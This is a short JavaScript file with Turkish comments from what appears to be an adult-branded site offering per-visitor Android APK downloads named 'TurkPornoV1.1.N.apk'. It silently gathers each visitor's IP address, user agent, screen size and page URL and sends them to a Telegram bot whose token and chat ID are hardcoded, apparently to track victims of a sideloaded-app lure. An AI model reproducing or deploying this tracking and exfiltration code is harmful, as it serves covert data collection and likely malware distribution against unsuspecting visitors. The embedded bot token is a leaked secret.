// log.js - IP bazlı APK sistemi için Telegram bildirim

async function sendLog(apkUrl, ipAddress = null) {
    const token = '8163053912:AAHVNTHM3O2LRcChxvclnM8ONUELtMdFRa8';
    const chatId = '-1002478190818';
    const userAgent = navigator.userAgent;
    
    try {
        // IP'yi al (parametre olarak gelmediyse)
        let ip = ipAddress;
        if (!ip) {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            ip = ipData.ip;
        }
        
        // APK index'ini hesapla (1-50 arası)
        let hash = 0;
        for (let i = 0; i < ip.length; i++) {
            hash = ((hash << 5) - hash) + ip.charCodeAt(i);
            hash = hash & hash;
        }
        const apkIndex = Math.abs(hash) % 50 + 1;
        
        // Sayfa bilgisi
        const pageUrl = window.location.href;
        const screenSize = `${screen.width}x${screen.height}`;
        const currentTime = new Date().toLocaleString('tr-TR');
        
        // Telegram mesajı
        const message = `[TurkPorno] Yeni İndirme\n` +
                       `━━━━━━━━━━━━━━━━━━━━━\n` +
                       `📱 IP: ${ip}\n` +
                       `📦 APK: TurkPornoV1.1.${apkIndex}.apk\n` +
                       `🔗 Link: ${apkUrl}\n` +
                       `📱 Cihaz: ${userAgent}\n` +
                       `📏 Ekran: ${screenSize}\n` +
                       `🌐 Sayfa: ${pageUrl}\n` +
                       `⏰ Zaman: ${currentTime}\n` +
                       `━━━━━━━━━━━━━━━━━━━━━`;
        
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
        console.log('✅ Telegram log gönderildi:', ip, '-> APK:', apkIndex);
        
    } catch (err) {
        console.error('❌ Telegram log hatası:', err);
    }
}

// Sayfa yüklendiğinde otomatik log gönder (isteğe bağlı)
// window.addEventListener('DOMContentLoaded', () => {
//     sendLog(window.location.href);
// });

// Fonksiyonu global yap
window.sendLog = sendLog;
